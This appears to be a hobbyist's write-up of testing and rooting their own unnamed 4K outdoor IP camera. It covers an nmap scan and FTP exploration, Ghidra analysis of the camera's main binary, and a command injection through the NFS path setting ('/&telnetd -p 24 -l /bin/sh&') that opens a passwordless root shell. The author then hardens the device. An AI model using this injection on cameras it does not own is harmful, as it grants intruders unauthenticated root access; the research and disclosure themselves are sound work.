# Cheap 4K outdoor camera penetration Test &amp; Rooting

### Summary

I got this POE 4K Outdoor camera from amazon with the intent of not needing a dedicated NVR unit (since it has SD card support). I really liked it and ended up getting 4 total for the house. This thing has a nice bright image (even in night mode) and is fully featured with motion detection, event server notification, email, snapshot, mjpeg, rtsp+onvif, cloud/app and even has some support for other protocols (it can even send email alerts and upload ftp snapshots). Honestly the only things I can complain about this device are: 1-when the conditions/image are at the tipping poing between bright and low light the sensor (hardware) seems to flicker for a few seconds while trying to perform the white balance, and 2-I have found a camera frozen every now and then and had to restart it (not often and there's an auto-reboot feature to mitigate the issue).

With that I am going to keep the brand name anonumous as there's no reason to hack/root this device other than for fun (or educational purposes), but you can drop me a line if you'd like to know the brand name (it is not any known/major brand).

Here's what the camera looks like:

![camera](https://raw.githubusercontent.com/guino/600204002-IPC-M0402/main/img/camera.png)

#### Penetration test and rooting

The first thing I did was to check what ports are open in the device. From the settings web page of the device I already expected to see some open ports which can be toggled on/off in the settings. Here's what I got:

```
$ nmap 10.10.10.128
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-07 16:00 EST
Nmap scan report for Fence (10.10.10.128)
Host is up (0.0041s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
23/tcp    open  telnet
80/tcp    open  http
554/tcp   open  rtsp
711/tcp   open  cisco-tdp
1935/tcp  open  rtmp
6000/tcp  open  X11
8000/tcp  open  http-alt
49152/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds
```

I was hoping to see telnet enabled so I could try the many published user:password combinations and gain access to the device, and while it was opened all my attempts to find a valid user:password combination were a failure.

So the next thing I noticed is that port 21 (ftp) was opened, but why would anyone need to ftp **into** the device ? I guess they made that so you could download video files from the SD card without having to physically get the SD card out (another feature?). The web interface user:password worked on the ftp and in fact I was able to see that the SD card is mounted under /mnt/mmc when a card is inserted. 

I then tried accessing /etc and other system directories even using tricks like "../" without success.

The ftp only allows access to what's under /mnt and what caught my attention was that there was a /mnt/app directory which showed me the following:

```
$ ftp 10.10.10.128
Connected to 10.10.10.128.
220 Service ready for new user.
Name (10.10.10.128:wagner): admin
331 User name okay, need password.
Password: 
230 User logged in, proceed.
Remote system type is UNIX.
ftp> cd /mnt/app
250 Requested file action okay, completed.
ftp> ls -la
200 Command okay.
150 File status okay; about to open data connection.
drwxr--r--  11 root root        0 Dec 31 19:00 .
drwxr--r--   7 root root       86 Apr 06 22:50 ..
-rwxr--r--   1 root root  1034800 Jul 14 03:43 mt7601Usta.ko
-rwxr--r--   1 root root  3285864 Jul 14 03:43 bvipcam
drwxr--r--   2 root root        0 Jul 14 03:43 pppoe
-rwxr--r--   1 root root    20696 Jul 14 03:43 detectsns
-rwxr--r--   1 root root    11080 Jul 14 03:43 reset
-rwxr--r--   1 root root    26880 Jul 14 03:43 softap.pcm
drwxr--r--   2 root root        0 Jul 14 03:43 lib
-rwxr--r--   1 root root     3700 Jan 06 17:06 start_ipcam.sh
-rwxr--r--   1 root root    24064 Jul 14 03:43 alarm.pcm
drwxr--r--   3 root root        0 Jul 14 03:43 config
-rwxr--r--   1 root root    10336 Jul 14 03:43 daemonserv
-rwxr--r--   1 root root    23540 Jul 14 03:43 cmdserv
-rwxr--r--   1 root root      662 Dec 31 19:00 system.conf
drwxr--r--   2 root root        0 Jul 14 03:43 sensor
-rwxr--r--   1 root root   181128 Jul 14 03:43 cfg80211.ko
-rwxr--r--   1 root root       43 Jul 14 03:43 version.conf
drwxr--r--   2 root root        0 Jul 14 03:43 https_env
drwxr--r--   2 root root        0 Jul 14 03:43 font
drwxr--r--   6 root root        0 Jul 14 03:43 www
-rwxr--r--   1 root root      840 Jul 14 03:43 checkusb.sh
drwxr--r--   2 root root        0 Jul 14 03:43 sysconf
226 Closing data connection.
ftp> 
```

I promptly downloaded the start_ipcam.sh script and found that this script started telnet and also started the bvipcam application which seemed to be the main application for the camera.

I then modified the start_ipcam.sh to start a passwordless telnet and tried to upload it back in place of the existing one, result: FAIL. Not only I can't overwrite the script but I can't upload anything to that directory (it seems the ftp server prevents uploading anything).

Since I can't modify anything with ftp, I figured I'd download the bvipcam application and have a look at it in ghidra to see if there's anything I can exploit.

In ghidra I found that the bvipcam manages the ftp server and web server. I also found what seemed to be a function for executing system/shell commands and went through the references to see if there was anything executing shell commands that I could inject my own command.

In the function that handles NFS mounting I found this (I named a few functions to make it clear):

![ghidra](https://raw.githubusercontent.com/guino/600204002-IPC-M0402/main/img/ghidra.png)

In the above we can see that they prepare the **mount** command using the NFS server IP and mount point without checking for any special characters (the mount point itself is fixed under /mnt/nfs). So I went into the device's web settings to look at the settings:

![nfs](https://raw.githubusercontent.com/guino/600204002-IPC-M0402/main/img/nfs.png)

While I am using NFS I can spare a few minutes without recording to try and gain access. 

The first thing I noticed is that the length of each setting is limited to 32 characters so I can't put anything big, but should be enough to open a passwordless telnet. 

When I tried to type ```;``` the page immediately removed it (which we may be able to bypass by making the request to save settings directly), in any case ```&``` was not filtered out so I entered this NFS remote path: ```/&telnetd -p 24 -l /bin/sh&```.

When I hit save I did not see telnet open and the device seemed like it stopped working (settings web page went down), so I rebooted the device hoping I didn't brick it somehow. The device not only came back up but the settings were still saved and this time I had a passwordless telnet available on port 24:

```
$ telnet 10.10.10.128 24
Trying 10.10.10.128...
Connected to 10.10.10.128.
Escape character is '^]'.

~ # 
```

## Success! 

Root access is available and I can modify/play with it all I want which in this case really is just modify /etc/passwd so it doesn't have a default root password that someone else knows while I don't. I wrote a modified /mnt/app/passwd file (which is writeable/persistent under telnet) and edited the start_ipcam.sh script to include ```mount --bind /mnt/app/passwd /etc/passwd``` and restored my NFS settings so now I got a working/protected/rooted device which only I can access (specially since I disabled P2P/Cloud from the web settings).
